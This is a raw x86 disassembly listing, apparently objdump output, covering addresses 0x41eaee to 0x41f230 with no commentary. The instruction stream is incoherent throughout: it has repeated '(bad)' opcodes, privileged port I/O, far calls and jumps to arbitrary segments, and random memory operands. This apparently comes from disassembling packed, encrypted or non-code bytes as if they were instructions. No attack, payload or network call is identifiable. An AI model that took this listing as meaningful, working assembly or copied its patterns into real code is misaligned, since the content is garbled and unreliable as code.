  41eaee:	xlat   BYTE PTR ds:[ebx]
  41eaef:	inc    ebp
  41eaf0:	inc    ecx
  41eaf1:	and    BYTE PTR [edi],bl
  41eaf3:	sub    DWORD PTR [ecx-0x2c],ebp
  41eaf6:	fnstsw WORD PTR [edi]
  41eaf8:	mov    bl,0xb3
  41eafa:	(bad)  
  41eafb:	scas   al,BYTE PTR es:[edi]
  41eafc:	sub    DWORD PTR [edx-0x10],edx
  41eaff:	push   ebx
  41eb00:	pop    esi
  41eb01:	mov    cs,WORD PTR [edx+0x58]
  41eb04:	pop    es
  41eb05:	inc    ecx
  41eb07:	call   0x2852:0x9eb7056f
  41eb0e:	scas   eax,DWORD PTR es:[edi]
  41eb0f:	loope  0x41eae1
  41eb11:	jge    0x41eaca
  41eb13:	mov    cl,0x19
  41eb15:	xchg   ebp,eax
  41eb16:	xlat   BYTE PTR ds:[ebx]
  41eb17:	scas   al,BYTE PTR es:[edi]
  41eb18:	xor    al,0x58
  41eb1a:	in     eax,0xc3
  41eb1c:	outs   dx,DWORD PTR ds:[esi]
  41eb1d:	mov    WORD PTR [esi+edi*2+0x46c95472],cs
  41eb24:	lods   eax,DWORD PTR ds:[esi]
  41eb25:	and    DWORD PTR [ebx-0x2182d2b5],0xffffffec
  41eb2c:	jg     0x41eb3d
  41eb2e:	loopne 0x41eba4
  41eb30:	pop    edi
  41eb31:	xlat   BYTE PTR ds:[ebx]
  41eb32:	shr    DWORD PTR [eax-0x6e],0x37
  41eb36:	mov    ?,ecx
  41eb38:	call   ecx
  41eb3a:	mov    esp,0xd599676a
  41eb3f:	ins    DWORD PTR es:[edi],dx
  41eb40:	(bad)  
  41eb41:	nop
  41eb42:	mov    esp,0xc4a76685
  41eb47:	aam    0x46
  41eb49:	adc    DWORD PTR [ecx+0x5bb82d05],ecx
  41eb4f:	jbe    0x41eb2e
  41eb51:	fdiv   DWORD PTR [ebx-0x13]
  41eb54:	push   ecx
  41eb55:	ds lahf 
  41eb57:	shl    DWORD PTR [esi],1
  41eb59:	jns    0x41eaf4
  41eb5b:	(bad)  [eax-0x2e84afc7]
  41eb61:	jns    0x41eb8f
  41eb63:	in     eax,dx
  41eb64:	mov    edi,0x81c07362
  41eb69:	and    ebx,DWORD PTR [ebx+0x3f]
  41eb6c:	ret    
  41eb6d:	cmp    cl,BYTE PTR [edi+0xf]
  41eb70:	iret   
  41eb71:	sbb    edi,DWORD PTR [edx]
  41eb73:	loopne 0x41ebb0
  41eb75:	lock dec ebx
  41eb77:	ins    BYTE PTR es:[edi],dx
  41eb78:	mov    ebp,0x8681130a
  41eb7d:	fwait
  41eb7e:	clc    
  41eb7f:	mov    edx,0xf2c8847e
  41eb84:	outs   dx,DWORD PTR ds:[esi]
  41eb85:	xor    ecx,esi
  41eb87:	pusha  
  41eb88:	adc    edx,DWORD PTR [esi-0x2f0ce6c1]
  41eb8e:	test   BYTE PTR [eax-0x60672b19],ch
  41eb94:	add    DWORD PTR [esp+eiz*4],ecx
  41eb97:	es mov esp,0x1290515c
  41eb9d:	test   al,dh
  41eb9f:	daa    
  41eba0:	rol    DWORD PTR [eax+edx*4-0x67],cl
  41eba4:	xor    eax,DWORD PTR [edi+0x12]
  41eba7:	test   eax,0x12c309b
  41ebac:	pop    esp
  41ebad:	mov    ebp,0xff7b160f
  41ebb2:	sar    BYTE PTR [eax-0x5e4d0b41],1
  41ebb8:	test   BYTE PTR [ecx+0x39],bl
  41ebbb:	add    al,bl
  41ebbd:	push   edi
  41ebbe:	push   esi
  41ebbf:	sar    bl,cl
  41ebc1:	cmc    
  41ebc2:	lock jecxz 0x41ebcb
  41ebc5:	adc    eax,0x3521aa05
  41ebca:	mov    esp,0x42f3d41a
  41ebcf:	jbe    0x41ebe6
  41ebd1:	dec    ebx
  41ebd2:	jno    0x41ebda
  41ebd4:	jl     0x41eb86
  41ebd6:	sbb    edi,DWORD PTR [edi+0x6e263abe]
  41ebdc:	ja     0x41ec11
  41ebde:	bound  edi,QWORD PTR [ebp+0xc9fdd95]
  41ebe4:	ins    DWORD PTR es:[edi],dx
  41ebe5:	mov    ebx,0xaf40b15e
  41ebea:	jo     0x41eb87
  41ebec:	cwde   
  41ebed:	sub    cl,cl
  41ebef:	enter  0xa08d,0x3c
  41ebf3:	pop    ss
  41ebf4:	pushf  
  41ebf5:	xchg   ebx,eax
  41ebf6:	test   DWORD PTR [edx+0x786a608e],edx
  41ebfc:	push   edx
  41ebfd:	out    0x54,al
  41ebff:	ja     0x41ec35
  41ec01:	add    eax,DWORD PTR [eax-0x76]
  41ec04:	cdq    
  41ec05:	sub    esp,ebx
  41ec07:	jnp    0x41ec07
  41ec09:	shl    DWORD PTR [eax],cl
  41ec0b:	ins    DWORD PTR es:[edi],dx
  41ec0c:	(bad)  
  41ec0d:	jmp    0x41eb96
  41ec0f:	add    al,0x8e
  41ec11:	ja     0x41ec0e
  41ec13:	pusha  
  41ec14:	jb     0x41ebf8
  41ec16:	push   es
  41ec17:	arpl   WORD PTR [ecx-0x12],cx
  41ec1a:	leave  
  41ec1b:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec1d:	push   cs
  41ec1e:	cmp    ah,BYTE PTR [eax]
  41ec20:	xchg   esp,eax
  41ec21:	mov    ebp,0x9a1e2a51
  41ec26:	pop    es
  41ec27:	cdq    
  41ec28:	mov    esi,DWORD PTR [ebx-0x1f6d152f]
  41ec2e:	and    al,0x25
  41ec30:	jmp    0xed9b:0xd8de5148
  41ec37:	and    edx,DWORD PTR [esp+ecx*2-0x48]
  41ec3b:	cmp    esp,DWORD PTR [edi+ecx*8+0x35]
  41ec3f:	xchg   bl,dl
  41ec41:	jbe    0x41ec22
  41ec43:	mov    bl,0xf4
  41ec45:	cmp    BYTE PTR [edx+ebp*2-0xe],ch
  41ec49:	bnd jns 0x41ebe0
  41ec4c:	or     eax,0x44199700
  41ec51:	fwait
  41ec52:	shr    DWORD PTR [esi-0x67bbf923],0x79
  41ec59:	mov    ebx,0x7317a16
  41ec5e:	inc    ebp
  41ec5f:	out    dx,eax
  41ec60:	push   ds
  41ec61:	inc    edx
  41ec62:	add    esp,DWORD PTR [ebx-0x3f]
  41ec65:	push   0xffffffe3
  41ec67:	in     al,dx
  41ec68:	or     eax,ebx
  41ec6a:	sahf   
  41ec6b:	pcmpgtb mm6,mm5
  41ec6e:	pop    esp
  41ec6f:	rcl    eax,cl
  41ec71:	pusha  
  41ec72:	cdq    
  41ec73:	rcr    BYTE PTR [ebx+0x19c69475],1
  41ec79:	sbb    al,0x68
  41ec7b:	stos   BYTE PTR es:[edi],al
  41ec7c:	rol    DWORD PTR [eax+0x19ec2f7f],0x27
  41ec83:	sbb    al,0xfa
  41ec85:	jg     0x41ec34
  41ec87:	cdq    
  41ec88:	(bad)  
  41ec89:	dec    esp
  41ec8a:	push   edx
  41ec8b:	push   edx
  41ec8c:	lock mov edi,DWORD PTR [edx+ebp*2]
  41ec90:	icebp  
  41ec91:	into   
  41ec92:	rol    BYTE PTR [eax-0x4c],cl
  41ec95:	adc    bh,BYTE PTR [ebp+0x32]
  41ec98:	jo     0x41eccf
  41ec9a:	add    bl,0x1e
  41ec9d:	xchg   edi,eax
  41ec9e:	ror    DWORD PTR [eax-0x69],cl
  41eca1:	cmp    ebp,DWORD PTR [ebp-0x66663aa3]
  41eca7:	leave  
  41eca8:	adc    al,BYTE PTR [eax]
  41ecaa:	mov    ds:0x210a14c,al
  41ecaf:	mov    eax,0x8dc15bba
  41ecb4:	and    al,0xb5
  41ecb6:	fisub  WORD PTR [ebp-0x553acc84]
  41ecbc:	inc    edx
  41ecbd:	adc    ch,BYTE PTR [edx+0x7db13037]
  41ecc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecc4:	call   0xba9a582e
  41ecc9:	nop
  41ecca:	imul   esi,DWORD PTR [esi-0x2b],0x6d
  41ecce:	dec    edx
  41eccf:	push   0xcc29ace2
  41ecd4:	and    cl,BYTE PTR [edi-0x6bd82ff]
  41ecda:	push   ss
  41ecdb:	adc    edx,eax
  41ecdd:	add    edx,DWORD PTR [ebx-0x69]
  41ece0:	mov    esp,0x2ced2330
  41ece5:	int    0x1f
  41ece7:	add    ah,BYTE PTR [esi+0x3698d3c6]
  41eced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecee:	sti    
  41ecef:	cli    
  41ecf0:	retf   
  41ecf1:	jmp    0xe0f3796f
  41ecf6:	adc    DWORD PTR [eax-0x4e273d76],0x6acb930
  41ed00:	push   esp
  41ed01:	jbe    0x41ed75
  41ed03:	adc    DWORD PTR gs:[esi+0x33],eax
  41ed07:	fidivr DWORD PTR [esi]
  41ed09:	adc    DWORD PTR [esi+0x69888780],ecx
  41ed0f:	cmp    al,0xd4
  41ed11:	pop    ecx
  41ed12:	ret    0xa7e7
  41ed15:	lods   al,BYTE PTR ds:[esi]
  41ed16:	inc    ebp
  41ed17:	ja     0x41ed31
  41ed19:	inc    edx
  41ed1a:	popf   
  41ed1b:	fld    DWORD PTR [esi-0x63b59f65]
  41ed21:	or     DWORD PTR [ebx+0x21],esp
  41ed24:	lea    edi,[edi]
  41ed26:	out    0x51,eax
  41ed28:	add    al,BYTE PTR [edi+eax*2+0x6d59cb10]
  41ed2f:	test   ebp,ebx
  41ed31:	sar    BYTE PTR [edi-0x36],1
  41ed34:	mov    bl,0xb2
  41ed36:	icebp  
  41ed37:	add    esp,DWORD PTR [eax-0x70]
  41ed3a:	adc    eax,0x552fedaa
  41ed3f:	pusha  
  41ed40:	sbb    DWORD PTR [ebp+0x20427d1],ebp
  41ed46:	sahf   
  41ed47:	dec    ebp
  41ed48:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed4b:	sar    BYTE PTR [eax],1
  41ed4d:	cmp    ebx,esp
  41ed4f:	fisub  DWORD PTR [eax-0x30cc3904]
  41ed55:	in     eax,dx
  41ed56:	das    
  41ed57:	pop    ebp
  41ed58:	arpl   WORD PTR [ebx-0x45685fe3],si
  41ed5e:	and    ah,ch
  41ed60:	ds clc 
  41ed62:	push   ss
  41ed63:	pop    ebp
  41ed64:	xchg   ecx,eax
  41ed65:	adc    esi,DWORD PTR [eax-0x796866f5]
  41ed6b:	ins    DWORD PTR es:[edi],dx
  41ed6c:	int    0x8f
  41ed6e:	mov    ah,0x95
  41ed70:	xchg   edx,eax
  41ed71:	es je  0x41edb2
  41ed74:	xchg   esp,eax
  41ed75:	lods   al,BYTE PTR ds:[esi]
  41ed76:	fst    DWORD PTR [ebx-0x39d3b812]
  41ed7c:	jp     0x41ed47
  41ed7e:	pop    ecx
  41ed7f:	pop    edx
  41ed80:	sub    eax,0x710353d6
  41ed85:	add    dl,BYTE PTR [eax+0x7394a27f]
  41ed8b:	push   ds
  41ed8c:	mov    ebx,0x9ba9c4e8
  41ed91:	loope  0x41ed44
  41ed93:	popa   
  41ed94:	ds hlt 
  41ed96:	int3   
  41ed97:	aaa    
  41ed98:	stos   DWORD PTR es:[edi],eax
  41ed99:	jnp    0x41edca
  41ed9b:	push   eax
  41ed9c:	sbb    al,0x71
  41ed9e:	and    eax,0xdd3f9799
  41eda3:	out    0x78,eax
  41eda5:	cmp    eax,0x52bfc9c9
  41edaa:	cmp    eax,0xc89865af
  41edaf:	xchg   edi,eax
  41edb0:	stos   BYTE PTR es:[edi],al
  41edb1:	inc    ecx
  41edb2:	xchg   esp,eax
  41edb3:	and    WORD PTR [edx+eax*2-0x5b499848],bx
  41edbb:	jmp    0x15236de0
  41edc0:	dec    ecx
  41edc1:	and    al,BYTE PTR [edx+0x20173d95]
  41edc7:	pop    edi
  41edc8:	je     0x41ed6d
  41edca:	mov    ebx,0xa28eb6
  41edcf:	and    DWORD PTR [esi-0x4f1285b7],ebx
  41edd5:	mov    dl,0x97
  41edd7:	fwait
  41edd8:	cmp    dl,BYTE PTR [esi+edi*2-0x15fe821c]
  41eddf:	lods   eax,DWORD PTR ds:[esi]
  41ede0:	fisttp DWORD PTR [ebx-0x54]
  41ede3:	sub    al,0x83
  41ede5:	xchg   esp,eax
  41ede6:	mov    edi,0x363d00ae
  41edeb:	jg     0x41edb5
  41eded:	arpl   WORD PTR [esi],di
  41edef:	rol    al,cl
  41edf1:	dec    esi
  41edf2:	in     al,0xd6
  41edf4:	push   esp
  41edf5:	outs   dx,DWORD PTR ds:[esi]
  41edf6:	mov    bh,0x45
  41edf8:	cmp    eax,0x3a1e50e4
  41edfd:	lods   al,BYTE PTR ds:[esi]
  41edfe:	sbb    al,0xc9
  41ee00:	adc    esp,ecx
  41ee02:	leave  
  41ee03:	mov    al,0x83
  41ee05:	sbb    edx,DWORD PTR [eax-0x1c]
  41ee08:	or     ebp,ebp
  41ee0a:	outs   dx,DWORD PTR ds:[esi]
  41ee0b:	jae    0x41eda0
  41ee0d:	xchg   esp,eax
  41ee0e:	add    BYTE PTR [eax],al
  41ee10:	add    BYTE PTR [eax],al
  41ee12:	push   edx
  41ee13:	push   ecx
  41ee14:	cmp    BYTE PTR [ebx],al
  41ee16:	cmp    ebp,DWORD PTR [ebx+0x7b]
  41ee19:	push   ecx
  41ee1a:	pop    edx
  41ee1b:	mov    ch,0xf5
  41ee1d:	lahf   
  41ee1e:	mov    bl,0x66
  41ee20:	add    dl,BYTE PTR [eax+0x16911]
  41ee26:	hlt    
  41ee27:	add    al,0x0
  41ee29:	add    BYTE PTR [ecx+0x3eb501fe],dl
  41ee2f:	bound  esp,QWORD PTR [ebp-0xec45dc2]
  41ee35:	sub    ebp,DWORD PTR [edi+edi*1]
  41ee38:	jmp    0x69a1:0x215a5627
  41ee3f:	xor    BYTE PTR [esi-0x50],dh
  41ee42:	xchg   esp,eax
  41ee43:	mov    ds:0x36176c46,eax
  41ee48:	mov    ds:0x40eb2d9e,eax
  41ee4d:	cmc    
  41ee4e:	inc    eax
  41ee4f:	xchg   BYTE PTR [eax+eax*2-0x5],dh
  41ee53:	mov    esi,0x91e468e9
  41ee58:	xor    dh,BYTE PTR [ebp+0x6648d01e]
  41ee5e:	mov    cl,0x12
  41ee60:	or     DWORD PTR cs:[esi-0x5a117e0a],0xffffffe7
  41ee68:	std    
  41ee69:	sbb    edx,DWORD PTR [edx]
  41ee6b:	out    0x37,al
  41ee6d:	pop    ecx
  41ee6e:	adc    bl,BYTE PTR [ecx+0x4bd340bd]
  41ee74:	jbe    0x41ee51
  41ee76:	pop    ss
  41ee77:	jae    0x41ee0d
  41ee79:	and    eax,0xfd4db5a1
  41ee7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee7f:	xchg   ecx,eax
  41ee80:	or     DWORD PTR [ebx],ebx
  41ee82:	inc    esi
  41ee83:	push   ebx
  41ee84:	mov    edi,0x9e02b9de
  41ee89:	test   al,0x34
  41ee8b:	fsub   QWORD PTR es:[ecx-0x2]
  41ee90:	(bad)  
  41ee93:	jno    0x41ee55
  41ee95:	jp     0x41ee32
  41ee97:	out    0xe9,al
  41ee99:	lods   al,BYTE PTR ds:[esi]
  41ee9a:	push   0x8ec7f401
  41ee9f:	out    0x46,eax
  41eea1:	dec    edi
  41eea2:	sahf   
  41eea3:	and    eax,0xc251d90d
  41eea8:	pop    ss
  41eea9:	lock fdiv QWORD PTR [edi-0x579982b5]
  41eeb0:	cmp    al,0x9a
  41eeb2:	scas   eax,DWORD PTR es:[edi]
  41eeb3:	ins    DWORD PTR es:[edi],dx
  41eeb4:	xor    esp,DWORD PTR [ebp-0x736c1a8c]
  41eeba:	iret   
  41eebb:	xchg   BYTE PTR [ebp+0x378740b4],al
  41eec1:	lods   eax,DWORD PTR ds:[esi]
  41eec2:	add    eax,0xdf568ef6
  41eec7:	ja     0x41ef1a
  41eec9:	std    
  41eeca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eecb:	pop    es
  41eecc:	mov    ds:0xb306f97f,al
  41eed1:	or     BYTE PTR [esi],bh
  41eed3:	adc    ecx,ecx
  41eed5:	push   eax
  41eed6:	mov    dh,0xad
  41eed8:	fiadd  WORD PTR ds:0x7b04e1ed
  41eede:	adc    BYTE PTR [ebp+eiz*1+0x1c249173],ch
  41eee5:	(bad)  [eax]
  41eee7:	shl    DWORD PTR [ebp+0x3ab96b0c],0xb9
  41eeee:	fnstcw WORD PTR [edx-0x45]
  41eef1:	xchg   edi,eax
  41eef2:	xchg   DWORD PTR [ebp+0x38],esp
  41eef5:	xchg   ebx,eax
  41eef6:	pop    ds
  41eef7:	fsubr  QWORD PTR [ebx+0x7ea0507b]
  41eefd:	mov    edi,0x5590ce47
  41ef02:	add    BYTE PTR [eax],cl
  41ef04:	sar    BYTE PTR [eax+ebx*2],1
  41ef07:	and    al,0xdd
  41ef09:	arpl   WORD PTR [edx],si
  41ef0b:	sub    dl,bl
  41ef0d:	push   esi
  41ef0e:	pop    ecx
  41ef0f:	inc    ebp
  41ef10:	pop    ebp
  41ef11:	jl     0x41eec4
  41ef13:	neg    BYTE PTR [edi-0x6992f2ed]
  41ef19:	dec    ebp
  41ef1a:	out    0x86,eax
  41ef1c:	into   
  41ef1d:	nop
  41ef1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef1f:	loop   0x41eeac
  41ef21:	dec    eax
  41ef22:	aad    0x3e
  41ef24:	mov    bh,0x1d
  41ef26:	out    0xef,eax
  41ef28:	scas   al,BYTE PTR es:[edi]
  41ef29:	retf   
  41ef2a:	sub    DWORD PTR [ebx+0x78],ecx
  41ef2d:	gs dec ebx
  41ef2f:	sbb    eax,0x8921d9f4
  41ef34:	movzx  esi,BYTE PTR [edi-0x30705ed9]
  41ef3b:	mov    eax,0x3fdadc6e
  41ef40:	inc    edx
  41ef41:	nop
  41ef42:	jg     0x41ef94
  41ef44:	dec    eax
  41ef45:	pop    ds
  41ef46:	stos   BYTE PTR es:[edi],al
  41ef47:	out    dx,al
  41ef48:	mov    cl,cl
  41ef4a:	xchg   esp,eax
  41ef4b:	mov    dl,0xbc
  41ef4d:	mov    esp,0x7c5a5cfa
  41ef52:	test   esp,edi
  41ef54:	cli    
  41ef55:	dec    ebx
  41ef56:	call   0x8d87:0x4b3d4be5
  41ef5d:	scas   al,BYTE PTR es:[edi]
  41ef5e:	int3   
  41ef5f:	inc    edi
  41ef60:	xor    al,0x51
  41ef62:	push   esp
  41ef63:	mov    esp,DWORD PTR [ebx-0x50]
  41ef66:	popf   
  41ef67:	mov    ch,0x8e
  41ef69:	call   0x5224ebfd
  41ef6e:	dec    ecx
  41ef6f:	mov    al,ds:0x84535b32
  41ef74:	clc    
  41ef75:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41ef77:	in     al,dx
  41ef78:	mov    al,0xbc
  41ef7a:	fstp   TBYTE PTR [edi-0x66d54f77]
  41ef80:	ins    DWORD PTR es:[edi],dx
  41ef81:	aas    
  41ef82:	mov    bl,0xa8
  41ef84:	sub    al,0xd4
  41ef86:	shr    DWORD PTR [edi],1
  41ef88:	iret   
  41ef89:	jl     0x41efb3
  41ef8b:	stos   DWORD PTR es:[edi],eax
  41ef8c:	pop    esi
  41ef8d:	pusha  
  41ef8e:	stc    
  41ef8f:	imul   ecx,DWORD PTR [edx-0x37acdd60],0xd0896686
  41ef99:	sahf   
  41ef9a:	xchg   ebp,eax
  41ef9b:	and    edx,DWORD PTR [ecx]
  41ef9d:	fild   QWORD PTR [ecx+0x1f]
  41efa0:	sbb    BYTE PTR [esi-0x2c],0xa7
  41efa4:	mov    dh,0x6e
  41efa6:	call   0x3c9d:0xa4c58b27
  41efad:	mov    al,ds:0xc5b2b0bd
  41efb2:	je     0x41efe7
  41efb4:	pusha  
  41efb5:	and    DWORD PTR [ebx+0x793c8190],ebp
  41efbb:	sub    al,0x56
  41efbd:	xchg   ch,bl
  41efbf:	(bad)  
  41efc0:	call   0x6d46ce44
  41efc5:	jmp    0x8f7a:0x32dc332b
  41efcc:	mov    ebp,0x1af30d6
  41efd1:	stos   BYTE PTR es:[edi],al
  41efd2:	sahf   
  41efd3:	sar    BYTE PTR [edi-0x36902e60],1
  41efd9:	sub    DWORD PTR [edi],eax
  41efdb:	push   0x6b
  41efdd:	mov    bl,0x6e
  41efdf:	(bad)  
  41efe0:	in     eax,dx
  41efe1:	sar    DWORD PTR ss:[ecx-0x1137add6],1
  41efe8:	push   ds
  41efe9:	cdq    
  41efea:	sub    ch,BYTE PTR [ecx]
  41efec:	loopne 0x41ef83
  41efee:	mov    al,0x35
  41eff0:	jge    0x41efb9
  41eff2:	sar    edi,0x8e
  41eff5:	inc    ebp
  41eff6:	sar    BYTE PTR [ebx],cl
  41eff8:	xchg   edi,eax
  41eff9:	iret   
  41effa:	pop    esi
  41effb:	and    eax,0x93fc1f8f
  41f000:	inc    eax
  41f001:	pop    ebx
  41f002:	repnz pop ds
  41f004:	out    0x8a,eax
  41f006:	fiadd  DWORD PTR [ecx-0x65]
  41f009:	jge    0x41ef91
  41f00b:	ds (bad) 
  41f00d:	int3   
  41f00e:	cli    
  41f00f:	adc    al,0xa0
  41f011:	push   ebp
  41f012:	adc    esi,0x76
  41f015:	in     eax,dx
  41f016:	cli    
  41f017:	pop    esi
  41f018:	sbb    cl,al
  41f01a:	xchg   esi,eax
  41f01b:	jg     0x41efa4
  41f01d:	jle    0x41f007
  41f01f:	adc    cl,BYTE PTR [edx+0x5c790f3]
  41f025:	nop
  41f026:	int    0x7f
  41f028:	mov    bh,0xf0
  41f02a:	out    dx,eax
  41f02b:	push   edi
  41f02c:	push   edx
  41f02d:	and    eax,0xea4163
  41f032:	into   
  41f033:	push   ebp
  41f034:	pop    edx
  41f035:	jnp    0x41f00f
  41f037:	fdivr  QWORD PTR [edx-0x1a]
  41f03a:	fcompp 
  41f03c:	pop    eax
  41f03d:	test   esp,ebx
  41f03f:	push   es
  41f040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f041:	in     al,dx
  41f042:	das    
  41f043:	test   ebx,edi
  41f045:	loopne 0x41f03a
  41f047:	fstp   TBYTE PTR [ebx+0x4ceb5617]
  41f04d:	lock or al,0x1c
  41f050:	push   0xe
  41f052:	aas    
  41f053:	jmp    0x21fe8429
  41f058:	xor    dl,BYTE PTR [eax]
  41f05a:	sbb    eax,0x2fae30e0
  41f05f:	fld    QWORD PTR [ebp-0x43]
  41f062:	pop    es
  41f063:	and    eax,0x747145d5
  41f068:	pop    esp
  41f069:	mov    esi,0x8faa099b
  41f06e:	stc    
  41f06f:	ins    DWORD PTR es:[edi],dx
  41f070:	je     0x41f0b8
  41f072:	js     0x41f099
  41f074:	adc    al,0xf2
  41f076:	sbb    BYTE PTR [ebp+0x0],dh
  41f079:	cld    
  41f07a:	repnz lahf 
  41f07c:	mov    ecx,0x95aa627f
  41f081:	pop    es
  41f082:	stos   BYTE PTR es:[edi],al
  41f083:	sbb    BYTE PTR [esp+esi*8-0x183dc0ae],ah
  41f08a:	fstp   st(2)
  41f08c:	pop    es
  41f08d:	dec    eax
  41f08e:	mov    dl,0xa7
  41f090:	fidivr DWORD PTR [edi-0x2b]
  41f093:	icebp  
  41f094:	dec    edi
  41f095:	loope  0x41f0ae
  41f097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f098:	gs int 0x4e
  41f09b:	ja     0x41f021
  41f09d:	stc    
  41f09e:	into   
  41f09f:	repnz mov ds:0xb79351a3,eax
  41f0a5:	or     eax,0xfef3e88a
  41f0aa:	outs   dx,DWORD PTR ds:[esi]
  41f0ab:	call   0x2bf65025
  41f0b0:	dec    esp
  41f0b1:	dec    edx
  41f0b2:	int3   
  41f0b3:	mov    eax,ds:0x12421b2c
  41f0b8:	int3   
  41f0b9:	jmp    0x712c8939
  41f0be:	xor    bl,BYTE PTR [edx-0x28]
  41f0c1:	xor    esi,DWORD PTR [ebx-0x68]
  41f0c4:	adc    eax,0x8f83fe3b
  41f0c9:	in     eax,dx
  41f0ca:	xchg   edx,eax
  41f0cb:	jno    0x41f0cd
  41f0cd:	scas   eax,DWORD PTR es:[edi]
  41f0ce:	test   al,0xe7
  41f0d0:	inc    ebp
  41f0d1:	mov    ds:0x1662fff1,al
  41f0d6:	dec    ebx
  41f0d7:	sti    
  41f0d8:	or     DWORD PTR ds:0x7621b3be,0x327de4a
  41f0e2:	ins    BYTE PTR es:[edi],dx
  41f0e3:	mov    ds:0xba0a4d82,eax
  41f0e8:	pop    eax
  41f0e9:	sbb    eax,0x92b155b4
  41f0ee:	mov    ebx,0x4c82ba76
  41f0f3:	cmp    eax,0xd8593a41
  41f0f8:	push   ebx
  41f0f9:	leave  
  41f0fa:	mov    ebp,0xf88d16f0
  41f0ff:	push   0x79
  41f101:	jmp    0x18620656
  41f106:	scas   al,BYTE PTR es:[edi]
  41f107:	push   0x15
  41f109:	xchg   esp,eax
  41f10a:	add    dh,BYTE PTR [ecx-0x48]
  41f10d:	hlt    
  41f10e:	adc    eax,0xc5ea655d
  41f113:	leave  
  41f114:	imul   eax,DWORD PTR [ebp-0x3e20aa9b],0x53
  41f11b:	and    ah,dh
  41f11d:	mov    ds:0x5eed3c6c,al
  41f122:	xor    al,0xa3
  41f124:	repnz mov ?,WORD PTR [edi+ebx*8]
  41f128:	js     0x41f0e7
  41f12a:	dec    ecx
  41f12b:	xchg   ebp,eax
  41f12c:	out    0x6c,al
  41f12e:	rcr    BYTE PTR [ebx],1
  41f130:	jecxz  0x41f162
  41f132:	in     al,0x29
  41f134:	jb     0x41f0f1
  41f136:	xchg   ebp,eax
  41f137:	or     ebx,edx
  41f139:	add    BYTE PTR [eax+0x7],0x3a
  41f13d:	inc    esi
  41f13e:	(bad)  
  41f13f:	add    al,0x33
  41f141:	push   edi
  41f142:	sbb    al,0xee
  41f144:	push   eax
  41f146:	push   ebp
  41f147:	jmp    0xefee38f9
  41f14c:	jg     0x41f177
  41f14e:	xor    al,0x40
  41f150:	jmp    0xe01fa30b
  41f155:	pop    ss
  41f156:	xor    bl,ah
  41f158:	in     al,0x85
  41f15a:	jg     0x41f151
  41f15c:	cli    
  41f15d:	pop    edi
  41f15e:	add    ch,BYTE PTR [edi]
  41f160:	out    0x6,eax
  41f162:	dec    esp
  41f163:	pusha  
  41f164:	scas   al,BYTE PTR es:[edi]
  41f165:	ds out 0x4b,al
  41f168:	mov    DWORD PTR [edx],edi
  41f16a:	jmp    0x41f10b
  41f16c:	xor    edi,ebp
  41f16e:	fisubr WORD PTR [ebx]
  41f170:	js     0x41f13d
  41f172:	lods   al,BYTE PTR ds:[esi]
  41f173:	cmp    eax,0x316db17e
  41f178:	sahf   
  41f179:	outs   dx,DWORD PTR ds:[esi]
  41f17a:	fcmovb st,st(5)
  41f17c:	call   0x972d:0x7cd4603a
  41f183:	mov    bl,0xc7
  41f185:	or     BYTE PTR [edx-0x25],ah
  41f188:	stc    
  41f189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f18a:	mov    eax,ds:0x64374603
  41f18f:	out    0x84,eax
  41f191:	mov    bh,0xe
  41f193:	jg     0x41f19a
  41f195:	mov    bl,0xc3
  41f197:	fistp  DWORD PTR [edi+0x66]
  41f19a:	jmp    0x41f15d
  41f19c:	in     al,0xe
  41f19e:	fmul   QWORD PTR [edx+ebx*1]
  41f1a1:	jb     0x41f203
  41f1a3:	mov    ah,0xde
  41f1a5:	shl    DWORD PTR [ebp+0x46ca7cf7],0x2d
  41f1ac:	je     0x41f1ee
  41f1ae:	ja     0x41f1ca
  41f1b0:	mov    al,0xdd
  41f1b2:	sub    BYTE PTR [ecx],bl
  41f1b4:	icebp  
  41f1b5:	in     al,0xc5
  41f1b7:	pop    ds
  41f1b8:	and    DWORD PTR [ebp-0x72],esp
  41f1bb:	xchg   BYTE PTR [ebp+0x61],dh
  41f1be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1bf:	cmp    DWORD PTR [edi+0x7],esi
  41f1c2:	sub    ebx,DWORD PTR [edi-0x75]
  41f1c5:	push   ss
  41f1c6:	xchg   edi,eax
  41f1c7:	jg     0x41f18c
  41f1c9:	jbe    0x41f181
  41f1cb:	es aad 0xc
  41f1ce:	xchg   edi,eax
  41f1cf:	sub    al,BYTE PTR [edi-0x541af33f]
  41f1d5:	xor    ebp,edx
  41f1d7:	cmp    al,0x39
  41f1d9:	pop    edi
  41f1da:	push   0xc93c073
  41f1df:	jb     0x41f219
  41f1e1:	(bad)  
  41f1e3:	sbb    BYTE PTR ds:0x1e6f07b7,cl
  41f1e9:	addr16 mov ebx,0xb635632
  41f1ef:	or     esi,DWORD PTR [edx+0x6f]
  41f1f2:	dec    eax
  41f1f3:	xchg   edi,eax
  41f1f4:	xlat   BYTE PTR ds:[ebx]
  41f1f5:	je     0x41f1e3
  41f1f7:	mov    ds:0xd29db9ae,al
  41f1fc:	pop    es
  41f1fd:	sbb    DWORD PTR [edi+0x397d8f57],esp
  41f203:	add    BYTE PTR [edi+0xd32cf67],al
  41f209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f20a:	pushf  
  41f20b:	add    eax,0xec0ff976
  41f210:	scas   eax,DWORD PTR es:[edi]
  41f211:	in     eax,0x73
  41f213:	nop
  41f214:	in     eax,dx
  41f215:	mov    edi,0x72855648
  41f21a:	imul   eax,ebx,0x3d450162
  41f220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f221:	sar    DWORD PTR [edx+0x22aa77da],1
  41f227:	ret    
  41f228:	in     eax,dx
  41f229:	add    DWORD PTR [ecx-0x4e],edi
  41f22c:	pop    esp
  41f22d:	dec    edx
  41f22e:	adc    al,0x9b
  41f230:	push   ebx
